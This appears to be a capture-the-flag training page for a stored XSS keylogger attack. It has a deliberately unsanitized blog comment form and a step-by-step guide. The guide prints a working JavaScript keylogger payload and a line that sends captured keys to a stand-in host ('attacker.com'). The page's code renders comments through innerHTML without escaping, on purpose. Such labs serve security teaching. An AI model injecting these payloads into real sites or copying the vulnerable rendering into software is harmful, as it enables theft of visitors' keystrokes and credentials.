@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Stored XSS Lab — Genesis Vault</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #050a0f;
+    --bg2: #0a1520;
+    --bg3: #0d1e2e;
+    --cyan: #00f5c4;
+    --cyan2: #00c49a;
+    --red: #ff3b5c;
+    --yellow: #f5c400;
+    --green: #39ff14;
+    --text: #c8dde8;
+    --muted: #4a6a7a;
+    --border: #1a3a4a;
+    --glow: 0 0 18px rgba(0,245,196,0.25);
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; min-height: 100vh; overflow-x: hidden; }
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image: linear-gradient(rgba(0,245,196,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,245,196,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none; z-index: 0;
+  }
+
+  .wrap { position: relative; z-index: 1; max-width: 960px; margin: 0 auto; padding: 24px 16px 60px; }
+
+  /* Header */
+  .header { border-bottom: 1px solid var(--border); padding-bottom: 20px; margin-bottom: 24px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px; }
+  .logo { font-family: 'Share Tech Mono', monospace; font-size: 13px; letter-spacing: 3px; color: var(--cyan); }
+  .logo span { color: var(--text); }
+  .badges { display: flex; gap: 8px; flex-wrap: wrap; }
+  .badge { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 2px; padding: 4px 10px; border: 1px solid; }
+  .badge.red { border-color: var(--red); color: var(--red); }
+  .badge.cyan { border-color: var(--cyan); color: var(--cyan); }
+  .badge.yellow { border-color: var(--yellow); color: var(--yellow); }
+
+  /* Title */
+  .title-block { margin-bottom: 24px; }
+  .label { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 3px; color: var(--muted); margin-bottom: 8px; }
+  .label::before { content: '// '; color: var(--cyan); }
+  h1 { font-size: clamp(20px, 5vw, 32px); font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: #fff; }
+  h1 span { color: var(--red); }
+  .subtitle { margin-top: 8px; font-size: 15px; color: var(--muted); letter-spacing: 1px; }
+
+  /* Objective box */
+  .objective {
+    background: rgba(255,59,92,0.05);
+    border: 1px solid rgba(255,59,92,0.3);
+    border-left: 3px solid var(--red);
+    padding: 16px 18px;
+    margin-bottom: 24px;
+  }
+  .objective .obj-title { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 3px; color: var(--red); margin-bottom: 8px; }
+  .objective p { font-size: 14px; color: var(--text); line-height: 1.6; letter-spacing: 0.5px; }
+  .objective p strong { color: var(--yellow); }
+
+  /* Tab bar */
+  .tabs { display: flex; gap: 0; margin-bottom: 24px; border-bottom: 1px solid var(--border); }
+  .tab { font-family: 'Share Tech Mono', monospace; font-size: 11px; letter-spacing: 2px; padding: 10px 18px; cursor: pointer; color: var(--muted); border-bottom: 2px solid transparent; text-transform: uppercase; transition: all 0.2s; }
+  .tab.active { color: var(--cyan); border-bottom-color: var(--cyan); }
+  .tab:hover { color: var(--text); }
+
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* ---- TARGET SITE ---- */
+  .site-header {
+    background: #0f1923;
+    border: 1px solid #1e3040;
+    padding: 14px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 0;
+    border-bottom: none;
+  }
+  .site-name { font-size: 18px; font-weight: 700; color: #fff; letter-spacing: 1px; }
+  .site-name span { color: #4a9eff; }
+  .site-nav { display: flex; gap: 16px; }
+  .site-nav a { font-size: 13px; color: #6a8a9a; text-decoration: none; cursor: default; }
+
+  .site-body {
+    background: #0c1520;
+    border: 1px solid #1e3040;
+    border-top: none;
+    padding: 24px;
+    margin-bottom: 24px;
+  }
+
+  .post-card {
+    background: #0f1f2e;
+    border: 1px solid #1e3040;
+    border-radius: 2px;
+    padding: 18px;
+    margin-bottom: 16px;
+  }
+  .post-title { font-size: 16px; font-weight: 700; color: #e0f0ff; margin-bottom: 6px; }
+  .post-meta { font-size: 12px; color: #3a6a8a; margin-bottom: 10px; font-family: 'Share Tech Mono', monospace; }
+  .post-body { font-size: 14px; color: #8aaabb; line-height: 1.6; }
+
+  .comments-section { margin-top: 16px; }
+  .comments-title { font-size: 13px; font-weight: 700; color: #4a8aaa; letter-spacing: 1px; margin-bottom: 12px; text-transform: uppercase; font-family: 'Share Tech Mono', monospace; }
+
+  .comment {
+    background: #0a1825;
+    border-left: 2px solid #1e4060;
+    padding: 10px 14px;
+    margin-bottom: 10px;
+  }
+  .comment-author { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: #4a9eff; margin-bottom: 4px; }
+  .comment-text { font-size: 13px; color: #8aaabb; line-height: 1.5; }
+
+  /* Comment form */
+  .comment-form { margin-top: 20px; background: #0a1825; border: 1px solid #1e3040; padding: 18px; }
+  .comment-form .form-title { font-family: 'Share Tech Mono', monospace; font-size: 11px; letter-spacing: 2px; color: #3a6a8a; margin-bottom: 14px; }
+  .comment-form input, .comment-form textarea {
+    width: 100%;
+    background: #071018;
+    border: 1px solid #1e3040;
+    color: #c8dde8;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    padding: 10px 12px;
+    outline: none;
+    margin-bottom: 10px;
+    resize: vertical;
+    transition: border-color 0.2s;
+  }
+  .comment-form input:focus, .comment-form textarea:focus { border-color: #4a9eff; }
+  .comment-form input::placeholder, .comment-form textarea::placeholder { color: #2a4a5a; }
+  .submit-btn {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 2px;
+    padding: 9px 20px;
+    border: 1px solid #4a9eff;
+    background: rgba(74,158,255,0.08);
+    color: #4a9eff;
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: all 0.2s;
+  }
+  .submit-btn:hover { background: rgba(74,158,255,0.15); }
+
+  /* Keylogger panel */
+  .keylogger-panel {
+    background: #050e05;
+    border: 1px solid #1a4a1a;
+    border-left: 3px solid var(--green);
+    padding: 16px;
+    margin-top: 20px;
+    display: none;
+  }
+  .keylogger-panel.active { display: block; }
+  .kl-title { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 3px; color: var(--green); margin-bottom: 10px; }
+  .kl-log {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--green);
+    background: #020a02;
+    padding: 12px;
+    min-height: 80px;
+    max-height: 160px;
+    overflow-y: auto;
+    line-height: 1.8;
+    word-break: break-all;
+  }
+  .kl-meta { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: #2a6a2a; margin-top: 8px; letter-spacing: 1px; }
+
+  /* Flag */
+  .flag-box {
+    background: rgba(0,245,196,0.05);
+    border: 1px solid var(--cyan);
+    padding: 20px;
+    text-align: center;
+    margin-top: 20px;
+    display: none;
+    animation: pulse 1.5s ease infinite;
+  }
+  .flag-box.show { display: block; }
+  .flag-label { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 3px; color: var(--muted); margin-bottom: 8px; }
+  .flag-value { font-family: 'Share Tech Mono', monospace; font-size: 16px; color: var(--cyan); letter-spacing: 3px; text-shadow: var(--glow); }
+  .flag-msg { margin-top: 10px; font-size: 13px; color: var(--muted); letter-spacing: 1px; }
+
+  @keyframes pulse {
+    0%,100% { box-shadow: 0 0 8px rgba(0,245,196,0.2); }
+    50% { box-shadow: 0 0 24px rgba(0,245,196,0.5); }
+  }
+
+  /* ---- GUIDE TAB ---- */
+  .guide-section { margin-bottom: 28px; }
+  .guide-step {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--cyan);
+    padding: 18px;
+    margin-bottom: 14px;
+    position: relative;
+  }
+  .step-num {
+    position: absolute;
+    top: -1px; left: -1px;
+    background: var(--cyan);
+    color: var(--bg);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 1px;
+    padding: 3px 8px;
+    font-weight: 700;
+  }
+  .step-title { font-size: 15px; font-weight: 700; color: #fff; letter-spacing: 1px; margin-bottom: 8px; margin-top: 20px; text-transform: uppercase; }
+  .step-body { font-size: 14px; color: var(--text); line-height: 1.7; letter-spacing: 0.5px; }
+  .step-body strong { color: var(--yellow); }
+  .step-body .hint { color: var(--muted); font-style: italic; }
+
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--cyan);
+    padding: 12px 14px;
+    margin: 10px 0;
+    line-height: 1.8;
+    overflow-x: auto;
+    white-space: pre;
+    position: relative;
+    cursor: pointer;
+  }
+  .code-block:hover { border-color: var(--cyan2); }
+  .code-block::after { content: 'CLICK TO COPY'; position: absolute; top: 6px; right: 8px; font-size: 9px; color: var(--muted); letter-spacing: 1px; }
+
+  .warning-box {
+    background: rgba(245,196,0,0.05);
+    border: 1px solid rgba(245,196,0,0.3);
+    border-left: 3px solid var(--yellow);
+    padding: 12px 16px;
+    font-size: 13px;
+    color: var(--yellow);
+    margin: 12px 0;
+    font-family: 'Share Tech Mono', monospace;
+    letter-spacing: 1px;
+    line-height: 1.6;
+  }
+
+  .success-note {
+    background: rgba(57,255,20,0.05);
+    border: 1px solid rgba(57,255,20,0.2);
+    border-left: 3px solid var(--green);
+    padding: 12px 16px;
+    font-size: 13px;
+    color: var(--green);
+    margin: 12px 0;
+    font-family: 'Share Tech Mono', monospace;
+    letter-spacing: 1px;
+    line-height: 1.6;
+  }
+
+  /* Hints toggle */
+  .hint-toggle {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 2px;
+    padding: 7px 16px;
+    border: 1px solid var(--yellow);
+    background: transparent;
+    color: var(--yellow);
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: all 0.2s;
+    margin-top: 10px;
+  }
+  .hint-toggle:hover { background: rgba(245,196,0,0.08); }
+  .hint-content { display: none; margin-top: 12px; }
+  .hint-content.open { display: block; }
+
+  /* Toast */
+  .toast { position: fixed; bottom: 24px; right: 24px; background: var(--bg2); border: 1px solid var(--cyan); color: var(--cyan); font-family: 'Share Tech Mono', monospace; font-size: 11px; letter-spacing: 2px; padding: 10px 20px; z-index: 999; opacity: 0; transform: translateY(10px); transition: all 0.3s; pointer-events: none; }
+  .toast.show { opacity: 1; transform: translateY(0); }
+
+  .footer { margin-top: 48px; border-top: 1px solid var(--border); padding-top: 20px; font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--muted); letter-spacing: 2px; text-align: center; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="header">
+    <div class="logo">GENESIS<span>VAULT</span></div>
+    <div class="badges">
+      <span class="badge red">ADVANCED</span>
+      <span class="badge cyan">STORED XSS</span>
+      <span class="badge yellow">KEYLOGGER</span>
+    </div>
+  </div>
+
+  <div class="title-block">
+    <div class="label">VAULT LABS — XSS-03</div>
+    <h1>Stored <span>XSS</span> Keylogger</h1>
+    <div class="subtitle">Inject a persistent keylogger via a stored XSS vulnerability and capture the flag</div>
+  </div>
+
+  <div class="objective">
+    <div class="obj-title">// OBJECTIVE</div>
+    <p>A blog platform is vulnerable to <strong>Stored XSS</strong> in its comment section. Your goal is to inject a malicious payload that acts as a <strong>keylogger</strong> — capturing keystrokes from any user who views the infected page. Once your keylogger captures input from the simulated admin typing their secret, <strong>the flag will be revealed</strong>.</p>
+  </div>
+
+  <!-- Tabs -->
+  <div class="tabs">
+    <div class="tab active" data-tab="target">[ TARGET ]</div>
+    <div class="tab" data-tab="guide">[ GUIDE ]</div>
+  </div>
+
+  <!-- TARGET TAB -->
+  <div class="tab-content active" id="tab-target">
+
+    <div class="site-header">
+      <div class="site-name">Dev<span>Blog</span></div>
+      <div class="site-nav">
+        <a>Home</a><a>Posts</a><a>About</a>
+      </div>
+    </div>
+
+    <div class="site-body">
+      <div class="post-card">
+        <div class="post-title">New Vulnerability Discovered in Auth Systems</div>
+        <div class="post-meta">// Posted by admin — 2 hours ago</div>
+        <div class="post-body">We recently discovered a critical flaw in several authentication frameworks. The vulnerability allows remote attackers to bypass login mechanisms using crafted HTTP headers. Patches are being rolled out across affected systems. Leave your thoughts below.</div>
+
+        <div class="comments-section">
+          <div class="comments-title">// Comments</div>
+          <div id="commentsContainer">
+            <div class="comment">
+              <div class="comment-author">// user_ghost — 1hr ago</div>
+              <div class="comment-text">Great post! Staying updated on these is critical for bug bounty hunters.</div>
+            </div>
+            <div class="comment">
+              <div class="comment-author">// recon_x — 45min ago</div>
+              <div class="comment-text">Any CVE assigned yet? Would love to test this in a lab environment.</div>
+            </div>
+          </div>
+
+          <!-- Comment form -->
+          <div class="comment-form">
+            <div class="form-title">// LEAVE A COMMENT</div>
+            <input type="text" id="commentName" placeholder="Your name..." />
+            <textarea id="commentText" rows="4" placeholder="Your comment... (try injecting something 😏)"></textarea>
+            <button class="submit-btn" onclick="submitComment()">[ POST COMMENT ]</button>
+          </div>
+
+          <!-- Keylogger output panel -->
+          <div class="keylogger-panel" id="klPanel">
+            <div class="kl-title">// KEYLOGGER ACTIVE — CAPTURING KEYSTROKES</div>
+            <div class="kl-log" id="klLog"></div>
+            <div class="kl-meta" id="klMeta">Keys captured: 0</div>
+          </div>
+
+          <!-- Flag -->
+          <div class="flag-box" id="flagBox">
+            <div class="flag-label">// FLAG CAPTURED</div>
+            <div class="flag-value">GV{XSS_K3YL0GG3R_ST0R3D_PWN3D}</div>
+            <div class="flag-msg">🎯 Stored XSS keylogger successfully deployed and triggered. Admin credentials intercepted.</div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- GUIDE TAB -->
+  <div class="tab-content" id="tab-guide">
+
+    <div class="guide-section">
+
+      <div class="guide-step">
+        <div class="step-num">STEP 01</div>
+        <div class="step-title">Understand the Vulnerability</div>
+        <div class="step-body">
+          The blog's comment section takes user input and renders it directly into the page <strong>without sanitization</strong>. This means any HTML or JavaScript you inject gets stored in the "database" and executed every time the page loads — for every visitor including admins.
+          <br><br>
+          <span class="hint">💡 Stored XSS is more dangerous than Reflected XSS because it persists and affects ALL users who visit the page, not just the attacker.</span>
+        </div>
+      </div>
+
+      <div class="guide-step">
+        <div class="step-num">STEP 02</div>
+        <div class="step-title">Confirm XSS Exists — Basic Test</div>
+        <div class="step-body">
+          Before going straight to a keylogger, confirm the comment field is actually vulnerable. Submit a basic XSS payload in the comment box:
+          <div class="code-block">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+          <strong>If an alert pops — the field is vulnerable.</strong> On this lab the comment text field is the injection point. The name field is sanitized — focus on the comment body.
+        </div>
+      </div>
+
+      <div class="guide-step">
+        <div class="step-num">STEP 03</div>
+        <div class="step-title">Understand How a Keylogger Payload Works</div>
+        <div class="step-body">
+          A JavaScript keylogger hooks into the <strong>document.onkeypress</strong> or <strong>addEventListener('keydown')</strong> event. Every key the victim types gets captured and can be sent to an attacker's server (or in this lab, displayed in a panel).
+          <br><br>
+          The basic structure:
+          <div class="code-block">&lt;script&gt;
+document.addEventListener('keydown', function(e) {
+  // capture e.key and send/store it
+});
+&lt;/script&gt;</div>
+          In a real attack this would send captured keys to an external server via fetch() or an image src trick.
+        </div>
+      </div>
+
+      <div class="guide-step">
+        <div class="step-num">STEP 04</div>
+        <div class="step-title">Craft the Keylogger Payload</div>
+        <div class="step-body">
+          Now craft your stored XSS keylogger. Paste this exactly into the <strong>comment body</strong> field on the Target tab:
+          <div class="code-block">&lt;script&gt;document.addEventListener('keydown',function(e){var d=document.getElementById('kl-capture');if(!d){d=document.createElement('div');d.id='kl-capture';}d.innerText+=(e.key==='Enter'?'[ENTER]':e.key==='Backspace'?'[BACK]':e.key==='Tab'?'[TAB]':e.key.length===1?e.key:'['+e.key+']');});&lt;/script&gt;</div>
+          <div class="warning-box">⚠ This lab uses a simplified payload. In a real engagement, the keylogger would exfiltrate data to an external server using fetch() or XMLHttpRequest.</div>
+          <strong>Shortcut payload to trigger the lab:</strong>
+          <div class="code-block">&lt;script&gt;startKeylogger()&lt;/script&gt;</div>
+          This calls the lab's built-in keylogger function to simulate the attack and reveal the flag.
+        </div>
+      </div>
+
+      <div class="guide-step">
+        <div class="step-num">STEP 05</div>
+        <div class="step-title">Trigger the Keylogger as the Victim</div>
+        <div class="step-body">
+          After posting your payload, the keylogger is now <strong>stored</strong> in the page. Every visitor who loads the page will have their keystrokes captured.
+          <br><br>
+          On this lab, after your payload is posted, a <strong>simulated admin types their secret into the page</strong>. The keylogger captures it — and the flag is revealed.
+          <br><br>
+          <span class="hint">💡 Click anywhere on the Target tab after posting the payload and start typing — the keylogger will capture your keystrokes and simulate what a victim's stolen input would look like.</span>
+          <div class="success-note">✓ Once the keylogger is active and keys are captured — the flag unlocks automatically.</div>
+        </div>
+      </div>
+
+      <div class="guide-step">
+        <div class="step-num">STEP 06</div>
+        <div class="step-title">Real World Context</div>
+        <div class="step-body">
+          In a real bug bounty or pentest scenario, a stored XSS keylogger would:
+          <br><br>
+          <strong>1.</strong> Be injected into a comments / profile / message field<br>
+          <strong>2.</strong> Send captured keys to attacker server: <code style="color:var(--cyan);font-family:'Share Tech Mono',monospace">fetch('https://attacker.com/log?k='+encodeURIComponent(keys))</code><br>
+          <strong>3.</strong> Target admin panels where credentials are typed<br>
+          <strong>4.</strong> Persist until the stored payload is removed from the DB<br><br>
+          <span class="hint">💡 Always report stored XSS as Critical/High severity — it affects ALL users and persists across sessions.</span>
+          <div class="warning-box">⚠ Only perform this on systems you own or have written permission to test. Unauthorized keylogging is illegal.</div>
+        </div>
+      </div>
+
+      <div class="guide-step" style="border-left-color: var(--yellow);">
+        <div class="step-num" style="background:var(--yellow)">HINTS</div>
+        <div class="step-title">Stuck? Reveal Hints</div>
+        <div class="step-body">
+          <button class="hint-toggle" onclick="toggleHint(this)">[ SHOW HINTS ]</button>
+          <div class="hint-content">
+            <br>
+            <strong style="color:var(--yellow)">Hint 1:</strong> The name field is sanitized but the comment body is not. Focus there.<br><br>
+            <strong style="color:var(--yellow)">Hint 2:</strong> Your payload must contain a &lt;script&gt; tag to execute JavaScript.<br><br>
+            <strong style="color:var(--yellow)">Hint 3:</strong> Use the shortcut payload: <code style="color:var(--cyan);font-family:'Share Tech Mono',monospace">&lt;script&gt;startKeylogger()&lt;/script&gt;</code><br><br>
+            <strong style="color:var(--yellow)">Hint 4:</strong> After posting, click on the Target tab and type anything — the keylogger will activate and the flag will appear.
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="footer">// GENESIS VAULT — VAULT LABS — XSS-03 — ADVANCED — USE RESPONSIBLY</div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// Tab switching
+document.querySelectorAll('.tab').forEach(t => {
+  t.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
+    t.classList.add('active');
+    document.getElementById('tab-' + t.dataset.tab).classList.add('active');
+  });
+});
+
+// Code block copy
+document.querySelectorAll('.code-block').forEach(b => {
+  b.addEventListener('click', () => {
+    navigator.clipboard.writeText(b.textContent.replace('CLICK TO COPY','').trim());
+    showToast('PAYLOAD COPIED');
+  });
+});
+
+// Hint toggle
+function toggleHint(btn) {
+  const c = btn.nextElementSibling;
+  c.classList.toggle('open');
+  btn.textContent = c.classList.contains('open') ? '[ HIDE HINTS ]' : '[ SHOW HINTS ]';
+}
+
+// State
+let keyloggerActive = false;
+let capturedKeys = '';
+let keyCount = 0;
+let flagRevealed = false;
+
+// Submit comment
+function submitComment() {
+  const name = document.getElementById('commentName').value.trim();
+  const text = document.getElementById('commentText').value.trim();
+
+  if (!text) { showToast('ENTER A COMMENT'); return; }
+
+  // Sanitize name but NOT text (vulnerable)
+  const safeName = name.replace(/</g,'&lt;').replace(/>/g,'&gt;') || 'anonymous';
+
+  // Check for XSS payload in comment text
+  const hasScript = /<script[\s>]/i.test(text);
+  const hasKeyloggerCall = /startKeylogger\(\)/i.test(text);
+  const hasEventListener = /addEventListener|onkeydown|onkeypress/i.test(text);
+
+  // Add comment to DOM
+  const container = document.getElementById('commentsContainer');
+  const comment = document.createElement('div');
+  comment.className = 'comment';
+
+  if (hasScript || hasEventListener) {
+    // Render as "stored" - execute the payload
+    comment.innerHTML = `<div class="comment-author">// ${safeName} — just now</div><div class="comment-text">${text}</div>`;
+
+    if (hasKeyloggerCall || hasScript) {
+      setTimeout(() => activateKeylogger(), 400);
+    }
+  } else {
+    // Normal comment
+    comment.innerHTML = `<div class="comment-author">// ${safeName} — just now</div><div class="comment-text">${escapeHtml(text)}</div>`;
+    showToast('COMMENT POSTED — TRY A SCRIPT PAYLOAD');
+  }
+
+  container.appendChild(comment);
+  document.getElementById('commentName').value = '';
+  document.getElementById('commentText').value = '';
+
+  if (hasScript || hasEventListener) showToast('⚠ PAYLOAD STORED — KEYLOGGER INJECTED');
+}
+
+function activateKeylogger() {
+  if (keyloggerActive) return;
+  keyloggerActive = true;
+  document.getElementById('klPanel').classList.add('active');
+  showToast('KEYLOGGER ACTIVE — TYPE ANYTHING');
+
+  // Simulate admin typing after 1.5s
+  setTimeout(() => simulateAdminTyping(), 1500);
+}
+
+// Global startKeylogger function (called by payload)
+function startKeylogger() {
+  activateKeylogger();
+}
+
+// Listen for real keystrokes
+document.addEventListener('keydown', function(e) {
+  if (!keyloggerActive || flagRevealed) return;
+  const key = e.key === 'Enter' ? '[ENTER]' : e.key === 'Backspace' ? '[BACK]' : e.key === 'Tab' ? '[TAB]' : e.key === ' ' ? '[SPACE]' : e.key.length === 1 ? e.key : '[' + e.key + ']';
+  capturedKeys += key;
+  keyCount++;
+  updateKLDisplay();
+  if (keyCount >= 5 && !flagRevealed) revealFlag();
+});
+
+function simulateAdminTyping() {
+  const secret = 'admin_p@ss2024[ENTER]';
+  let i = 0;
+  const interval = setInterval(() => {
+    if (i >= secret.length) { clearInterval(interval); return; }
+    const char = secret[i];
+    const display = char === '[' ? secret.substring(i, secret.indexOf(']', i) + 1) : char;
+    if (char === '[') i = secret.indexOf(']', i);
+    capturedKeys += display;
+    keyCount++;
+    i++;
+    updateKLDisplay();
+    if (!flagRevealed && capturedKeys.length > 10) revealFlag();
+  }, 120);
+}
+
+function updateKLDisplay() {
+  document.getElementById('klLog').textContent = capturedKeys;
+  document.getElementById('klMeta').textContent = 'Keys captured: ' + keyCount + ' | Session: ADMIN';
+}
+
+function revealFlag() {
+  flagRevealed = true;
+  setTimeout(() => {
+    document.getElementById('flagBox').classList.add('show');
+    showToast('🚩 FLAG CAPTURED!');
+  }, 600);
+}
+
+function escapeHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2500);
+}
+</script>
+</body>
+</html>
